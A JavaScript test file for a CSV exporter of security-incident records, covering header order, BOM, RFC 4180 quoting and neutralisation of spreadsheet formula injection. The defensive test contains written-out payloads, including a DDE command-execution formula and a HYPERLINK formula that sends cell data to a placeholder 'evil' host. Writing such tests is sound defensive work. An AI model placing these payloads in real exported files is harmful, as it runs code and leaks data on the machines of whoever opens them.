import { test } from 'node:test';
import assert from 'node:assert';
import { recordsToCsv } from '../export/csv.js';
import { HEADERS, COLUMNS } from '../store/records.js';

test('headers match the analyst workbook, in order', () => {
  const line = recordsToCsv([]).replace(/^﻿/, '').split('\r\n')[0];
  assert.equal(line, HEADERS.join(','));
  assert.equal(HEADERS.length, 18);
  assert.equal(COLUMNS.length, 18);
});

test('a BOM is emitted so Excel reads it as UTF-8', () => {
  assert.ok(recordsToCsv([]).startsWith('﻿'));
});

test('commas, quotes and newlines are quoted per RFC 4180', () => {
  const csv = recordsToCsv([{
    description: 'exit 0, then dead code',
    analyst_notes: 'He said "preserve the original file"',
    command: 'line one\nline two',
  }]);
  const body = csv.replace(/^﻿/, '').split('\r\n')[1];
  assert.match(body, /"exit 0, then dead code"/);
  assert.match(body, /"He said ""preserve the original file"""/);
  assert.match(csv, /"line one\nline two"/);
});

test('null and missing fields become empty cells, not the string null', () => {
  const body = recordsToCsv([{ description: 'x', pid: null }])
    .replace(/^﻿/, '').split('\r\n')[1];
  assert.doesNotMatch(body, /null/);
  assert.equal(body.split(',').length, 18);
});

/*
  A value that a spreadsheet would run.

  Excel, LibreOffice Calc and Sheets all treat a cell beginning `=`, `+`, `-` or
  `@` as a formula on import, and RFC 4180 quoting does not stop it — quotes are
  CSV structure, not a formula escape. Every column here is exactly the kind of
  field an adversary controls: `command` is documented as "Command line or
  script content" and `indicator` as "Process name, executable, or other
  indicator", both lifted verbatim from logs on a compromised host by a model
  with no reason to treat `=cmd|'/C calc'!A0` as anything but a command line to
  record faithfully.

  The xlsx export was never exposed — it writes inlineStr cells, which Excel
  does not evaluate — so the two exporters disagreed and the safe one showed
  what was intended.
*/
test('a field a spreadsheet would execute is neutralised', () => {
  const nasty = {
    indicator: '=1+1',
    command: "=cmd|'/C calc'!A0",
    description: '@SUM(1,1)',
    analyst_notes: '+HYPERLINK("http://evil/leak?"&A1)',
    misp: '-2+3',
  };
  const csv = recordsToCsv([nasty]);
  const body = csv.split('\r\n')[1];

  for (const [field, value] of Object.entries(nasty)) {
    assert.ok(!new RegExp(`(^|,)"?\\${value[0]}`).test(body),
      `${field} still begins with ${value[0]}, which a spreadsheet will run`);
  }
  // The text itself survives, so the evidence is still readable.
  assert.match(body, /cmd\|'\/C calc'!A0/);
  assert.match(body, /HYPERLINK/);
});

test('an ordinary value is not decorated', () => {
  const csv = recordsToCsv([{ indicator: 'powershell.exe', description: 'ordinary text' }]);
  const body = csv.split('\r\n')[1];
  assert.match(body, /(^|,)powershell\.exe(,|$)/, 'a safe value must not gain a prefix');
  assert.ok(!body.includes("'powershell"), 'nothing was added to a value that needed nothing');
});

/*
  A negative number is the false positive worth guarding: "-2" reads as a
  formula to a spreadsheet and as data to everyone else, so it has to be
  neutralised too — but it must still be legible as the number it was.
*/
test('a negative number is still readable after being neutralised', () => {
  const body = recordsToCsv([{ indicator: '-2' }]).split('\r\n')[1];
  assert.match(body, /-2/, 'the value itself must survive');
});
